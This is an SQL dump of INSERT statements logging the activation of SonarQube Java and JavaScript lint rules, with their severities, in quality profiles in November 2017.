INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (354, '2017-11-16 07:37:03.765', NULL, 'key=java-sonar-way-87983:squid:S3066;ruleKey=squid:S3066;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnwVbbGRdfPp-qiQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (355, '2017-11-16 07:37:03.769', NULL, 'key=java-sonar-way-87983:squid:S3067;ruleKey=squid:S3067;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnwZbbGRdfPp-qiR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (356, '2017-11-16 07:37:03.772', NULL, 'key=java-sonar-way-87983:squid:S3281;ruleKey=squid:S3281;profileKey=java-sonar-way-87983;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnwcbbGRdfPp-qiS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (357, '2017-11-16 07:37:03.776', NULL, 'key=java-sonar-way-87983:squid:S3346;ruleKey=squid:S3346;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnwgbbGRdfPp-qiT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (358, '2017-11-16 07:37:03.78', NULL, 'key=java-sonar-way-87983:squid:S3355;ruleKey=squid:S3355;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnwkbbGRdfPp-qiU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (359, '2017-11-16 07:37:03.785', NULL, 'key=java-sonar-way-87983:squid:S3358;ruleKey=squid:S3358;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnwpbbGRdfPp-qiV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (360, '2017-11-16 07:37:03.788', NULL, 'key=java-sonar-way-87983:squid:S3398;ruleKey=squid:S3398;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnwsbbGRdfPp-qiW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (361, '2017-11-16 07:37:03.794', NULL, 'key=java-sonar-way-87983:squid:S3400;ruleKey=squid:S3400;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnwybbGRdfPp-qiX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (362, '2017-11-16 07:37:03.798', NULL, 'key=java-sonar-way-87983:squid:S3415;ruleKey=squid:S3415;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnw2bbGRdfPp-qiY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (363, '2017-11-16 07:37:03.801', NULL, 'key=java-sonar-way-87983:squid:S3421;ruleKey=squid:S3421;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnw5bbGRdfPp-qiZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (364, '2017-11-16 07:37:03.81', NULL, 'key=java-sonar-way-87983:squid:S3422;ruleKey=squid:S3422;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnxBbbGRdfPp-qia');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (365, '2017-11-16 07:37:03.813', NULL, 'key=java-sonar-way-87983:squid:S3436;ruleKey=squid:S3436;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnxFbbGRdfPp-qib');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (366, '2017-11-16 07:37:03.816', NULL, 'key=java-sonar-way-87983:squid:S3437;ruleKey=squid:S3437;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnxIbbGRdfPp-qic');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (367, '2017-11-16 07:37:03.82', NULL, 'key=java-sonar-way-87983:squid:S3438;ruleKey=squid:S3438;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnxMbbGRdfPp-qid');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (368, '2017-11-16 07:37:03.824', NULL, 'key=java-sonar-way-87983:squid:S3457;ruleKey=squid:S3457;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnxPbbGRdfPp-qie');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (369, '2017-11-16 07:37:03.83', NULL, 'key=java-sonar-way-87983:squid:S3516;ruleKey=squid:S3516;profileKey=java-sonar-way-87983;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnxWbbGRdfPp-qif');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (370, '2017-11-16 07:37:03.835', NULL, 'key=java-sonar-way-87983:squid:S3518;ruleKey=squid:S3518;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnxbbbGRdfPp-qig');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (371, '2017-11-16 07:37:03.842', NULL, 'key=java-sonar-way-87983:squid:S3599;ruleKey=squid:S3599;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnxibbGRdfPp-qih');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (372, '2017-11-16 07:37:03.846', NULL, 'key=java-sonar-way-87983:squid:S3631;ruleKey=squid:S3631;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnxmbbGRdfPp-qii');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (373, '2017-11-16 07:37:03.88', NULL, 'key=java-sonar-way-87983:squid:S3655;ruleKey=squid:S3655;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnyIbbGRdfPp-qij');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (374, '2017-11-16 07:37:03.884', NULL, 'key=java-sonar-way-87983:squid:S3725;ruleKey=squid:S3725;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnyMbbGRdfPp-qik');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (375, '2017-11-16 07:37:03.888', NULL, 'key=java-sonar-way-87983:squid:S3776;ruleKey=squid:S3776;profileKey=java-sonar-way-87983;param_Threshold=15;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnyQbbGRdfPp-qil');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (376, '2017-11-16 07:37:03.893', NULL, 'key=java-sonar-way-87983:squid:S3824;ruleKey=squid:S3824;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnyVbbGRdfPp-qim');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (377, '2017-11-16 07:37:03.897', NULL, 'key=java-sonar-way-87983:squid:S3878;ruleKey=squid:S3878;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnyZbbGRdfPp-qin');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (378, '2017-11-16 07:37:03.902', NULL, 'key=java-sonar-way-87983:squid:S3923;ruleKey=squid:S3923;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnyebbGRdfPp-qio');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (379, '2017-11-16 07:37:03.905', NULL, 'key=java-sonar-way-87983:squid:S3958;ruleKey=squid:S3958;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnyhbbGRdfPp-qip');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (380, '2017-11-16 07:37:03.91', NULL, 'key=java-sonar-way-87983:squid:S3959;ruleKey=squid:S3959;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnymbbGRdfPp-qiq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (381, '2017-11-16 07:37:03.914', NULL, 'key=java-sonar-way-87983:squid:S3972;ruleKey=squid:S3972;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnyqbbGRdfPp-qir');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (382, '2017-11-16 07:37:03.919', NULL, 'key=java-sonar-way-87983:squid:S3981;ruleKey=squid:S3981;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnyubbGRdfPp-qis');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (383, '2017-11-16 07:37:03.923', NULL, 'key=java-sonar-way-87983:squid:S3984;ruleKey=squid:S3984;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnyzbbGRdfPp-qit');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (384, '2017-11-16 07:37:03.939', NULL, 'key=java-sonar-way-87983:squid:S3985;ruleKey=squid:S3985;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnzCbbGRdfPp-qiu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (385, '2017-11-16 07:37:03.943', NULL, 'key=java-sonar-way-87983:squid:S3986;ruleKey=squid:S3986;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnzHbbGRdfPp-qiv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (386, '2017-11-16 07:37:03.947', NULL, 'key=java-sonar-way-87983:squid:S4032;ruleKey=squid:S4032;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnzLbbGRdfPp-qiw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (387, '2017-11-16 07:37:03.952', NULL, 'key=java-sonar-way-87983:squid:S4034;ruleKey=squid:S4034;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnzQbbGRdfPp-qix');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (388, '2017-11-16 07:37:03.958', NULL, 'key=java-sonar-way-87983:squid:S4042;ruleKey=squid:S4042;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnzWbbGRdfPp-qiy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (389, '2017-11-16 07:37:03.966', NULL, 'key=java-sonar-way-87983:squid:S4065;ruleKey=squid:S4065;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnzebbGRdfPp-qiz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (390, '2017-11-16 07:37:03.974', NULL, 'key=java-sonar-way-87983:squid:S4087;ruleKey=squid:S4087;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnzmbbGRdfPp-qi0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (391, '2017-11-16 07:37:03.978', NULL, 'key=java-sonar-way-87983:squid:S4143;ruleKey=squid:S4143;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnzqbbGRdfPp-qi1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (392, '2017-11-16 07:37:03.982', NULL, 'key=java-sonar-way-87983:squid:S4144;ruleKey=squid:S4144;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnzubbGRdfPp-qi2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (393, '2017-11-16 07:37:03.985', NULL, 'key=java-sonar-way-87983:squid:S4165;ruleKey=squid:S4165;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnzxbbGRdfPp-qi3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (394, '2017-11-16 07:37:03.998', NULL, 'key=js-sonar-way-87564:javascript:S1442;ruleKey=javascript:S1442;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnz-bbGRdfPp-qi4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (395, '2017-11-16 07:37:04.005', NULL, 'key=js-sonar-way-87564:javascript:ArrayAndObjectConstructors;ruleKey=javascript:ArrayAndObjectConstructors;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn0FbbGRdfPp-qi5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (396, '2017-11-16 07:37:04.012', NULL, 'key=js-sonar-way-87564:javascript:BitwiseOperators;ruleKey=javascript:BitwiseOperators;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn0MbbGRdfPp-qi6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (397, '2017-11-16 07:37:04.018', NULL, 'key=js-sonar-way-87564:javascript:S1125;ruleKey=javascript:S1125;profileKey=js-sonar-way-87564;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn0SbbGRdfPp-qi7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (398, '2017-11-16 07:37:04.025', NULL, 'key=js-sonar-way-87564:javascript:BoundOrAssignedEvalOrArguments;ruleKey=javascript:BoundOrAssignedEvalOrArguments;profileKey=js-sonar-way-87564;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn0ZbbGRdfPp-qi8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (399, '2017-11-16 07:37:04.03', NULL, 'key=js-sonar-way-87564:javascript:CollapsibleIfStatements;ruleKey=javascript:CollapsibleIfStatements;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn0ebbGRdfPp-qi9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (400, '2017-11-16 07:37:04.036', NULL, 'key=js-sonar-way-87564:javascript:CommentedCode;ruleKey=javascript:CommentedCode;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn0kbbGRdfPp-qi-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (401, '2017-11-16 07:37:04.041', NULL, 'key=js-sonar-way-87564:javascript:S2688;ruleKey=javascript:S2688;profileKey=js-sonar-way-87564;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn0pbbGRdfPp-qi_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (402, '2017-11-16 07:37:04.046', NULL, 'key=js-sonar-way-87564:javascript:ConditionalComment;ruleKey=javascript:ConditionalComment;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn0ubbGRdfPp-qjA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (403, '2017-11-16 07:37:04.051', NULL, 'key=js-sonar-way-87564:javascript:S2228;ruleKey=javascript:S2228;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn0zbbGRdfPp-qjB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (404, '2017-11-16 07:37:04.055', NULL, 'key=js-sonar-way-87564:javascript:ConstructorFunctionsForSideEffects;ruleKey=javascript:ConstructorFunctionsForSideEffects;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn03bbGRdfPp-qjC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (405, '2017-11-16 07:37:04.058', NULL, 'key=js-sonar-way-87564:javascript:S2310;ruleKey=javascript:S2310;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn06bbGRdfPp-qjD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (406, '2017-11-16 07:37:04.062', NULL, 'key=js-sonar-way-87564:javascript:S1854;ruleKey=javascript:S1854;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn0-bbGRdfPp-qjE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (407, '2017-11-16 07:37:04.065', NULL, 'key=js-sonar-way-87564:javascript:DebuggerStatement;ruleKey=javascript:DebuggerStatement;profileKey=js-sonar-way-87564;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn1BbbGRdfPp-qjF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (408, '2017-11-16 07:37:04.069', NULL, 'key=js-sonar-way-87564:javascript:S3509;ruleKey=javascript:S3509;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn1FbbGRdfPp-qjG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (409, '2017-11-16 07:37:04.073', NULL, 'key=js-sonar-way-87564:javascript:S1788;ruleKey=javascript:S1788;profileKey=js-sonar-way-87564;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn1JbbGRdfPp-qjH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (410, '2017-11-16 07:37:04.076', NULL, 'key=js-sonar-way-87564:javascript:S2870;ruleKey=javascript:S2870;profileKey=js-sonar-way-87564;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn1MbbGRdfPp-qjI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (411, '2017-11-16 07:37:04.08', NULL, 'key=js-sonar-way-87564:javascript:S3001;ruleKey=javascript:S3001;profileKey=js-sonar-way-87564;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn1QbbGRdfPp-qjJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (412, '2017-11-16 07:37:04.083', NULL, 'key=js-sonar-way-87564:javascript:S3403;ruleKey=javascript:S3403;profileKey=js-sonar-way-87564;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn1TbbGRdfPp-qjK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (413, '2017-11-16 07:37:04.087', NULL, 'key=js-sonar-way-87564:javascript:S1871;ruleKey=javascript:S1871;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn1XbbGRdfPp-qjL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (414, '2017-11-16 07:37:04.09', NULL, 'key=js-sonar-way-87564:javascript:S1862;ruleKey=javascript:S1862;profileKey=js-sonar-way-87564;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn1abbGRdfPp-qjM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (415, '2017-11-16 07:37:04.093', NULL, 'key=js-sonar-way-87564:javascript:DuplicateFunctionArgument;ruleKey=javascript:DuplicateFunctionArgument;profileKey=js-sonar-way-87564;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn1dbbGRdfPp-qjN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (416, '2017-11-16 07:37:04.097', NULL, 'key=js-sonar-way-87564:javascript:DuplicatePropertyName;ruleKey=javascript:DuplicatePropertyName;profileKey=js-sonar-way-87564;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn1gbbGRdfPp-qjO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (417, '2017-11-16 07:37:04.1', NULL, 'key=js-sonar-way-87564:javascript:EmptyBlock;ruleKey=javascript:EmptyBlock;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn1kbbGRdfPp-qjP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (418, '2017-11-16 07:37:04.104', NULL, 'key=js-sonar-way-87564:javascript:EqEqEq;ruleKey=javascript:EqEqEq;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn1obbGRdfPp-qjQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (419, '2017-11-16 07:37:04.107', NULL, 'key=js-sonar-way-87564:javascript:S888;ruleKey=javascript:S888;profileKey=js-sonar-way-87564;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn1rbbGRdfPp-qjR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (420, '2017-11-16 07:37:04.111', NULL, 'key=js-sonar-way-87564:javascript:Eval;ruleKey=javascript:Eval;profileKey=js-sonar-way-87564;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn1vbbGRdfPp-qjS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (421, '2017-11-16 07:37:04.119', NULL, 'key=js-sonar-way-87564:javascript:ExcessiveParameterList;ruleKey=javascript:ExcessiveParameterList;profileKey=js-sonar-way-87564;param_maximumFunctionParameters=7;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn13bbGRdfPp-qjT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (422, '2017-11-16 07:37:04.127', NULL, 'key=js-sonar-way-87564:javascript:S1067;ruleKey=javascript:S1067;profileKey=js-sonar-way-87564;param_max=3;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn1_bbGRdfPp-qjU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (423, '2017-11-16 07:37:04.131', NULL, 'key=js-sonar-way-87564:javascript:S3317;ruleKey=javascript:S3317;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn2DbbGRdfPp-qjV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (424, '2017-11-16 07:37:04.134', NULL, 'key=js-sonar-way-87564:javascript:S1134;ruleKey=javascript:S1134;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn2GbbGRdfPp-qjW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (425, '2017-11-16 07:37:04.138', NULL, 'key=js-sonar-way-87564:javascript:S1264;ruleKey=javascript:S1264;profileKey=js-sonar-way-87564;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn2KbbGRdfPp-qjX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (426, '2017-11-16 07:37:04.141', NULL, 'key=js-sonar-way-87564:javascript:ForIn;ruleKey=javascript:ForIn;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn2NbbGRdfPp-qjY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (427, '2017-11-16 07:37:04.144', NULL, 'key=js-sonar-way-87564:javascript:S1994;ruleKey=javascript:S1994;profileKey=js-sonar-way-87564;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn2QbbGRdfPp-qjZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (428, '2017-11-16 07:37:04.148', NULL, 'key=js-sonar-way-87564:javascript:S2251;ruleKey=javascript:S2251;profileKey=js-sonar-way-87564;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn2UbbGRdfPp-qja');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (429, '2017-11-16 07:37:04.152', NULL, 'key=js-sonar-way-87564:javascript:S1472;ruleKey=javascript:S1472;profileKey=js-sonar-way-87564;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn2YbbGRdfPp-qjb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (430, '2017-11-16 07:37:04.156', NULL, 'key=js-sonar-way-87564:javascript:FunctionComplexity;ruleKey=javascript:FunctionComplexity;profileKey=js-sonar-way-87564;param_maximumFunctionComplexityThreshold=10;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn2cbbGRdfPp-qjc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (431, '2017-11-16 07:37:04.16', NULL, 'key=js-sonar-way-87564:javascript:FunctionDeclarationsWithinBlocks;ruleKey=javascript:FunctionDeclarationsWithinBlocks;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn2gbbGRdfPp-qjd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (432, '2017-11-16 07:37:04.164', NULL, 'key=js-sonar-way-87564:javascript:FunctionDefinitionInsideLoop;ruleKey=javascript:FunctionDefinitionInsideLoop;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn2kbbGRdfPp-qje');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (433, '2017-11-16 07:37:04.167', NULL, 'key=js-sonar-way-87564:javascript:FutureReservedWords;ruleKey=javascript:FutureReservedWords;profileKey=js-sonar-way-87564;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn2nbbGRdfPp-qjf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (434, '2017-11-16 07:37:04.171', NULL, 'key=js-sonar-way-87564:javascript:S3531;ruleKey=javascript:S3531;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn2rbbGRdfPp-qjg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (435, '2017-11-16 07:37:04.175', NULL, 'key=js-sonar-way-87564:javascript:S2990;ruleKey=javascript:S2990;profileKey=js-sonar-way-87564;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn2vbbGRdfPp-qjh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (436, '2017-11-16 07:37:04.178', NULL, 'key=js-sonar-way-87564:javascript:HtmlComments;ruleKey=javascript:HtmlComments;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn2ybbGRdfPp-qji');
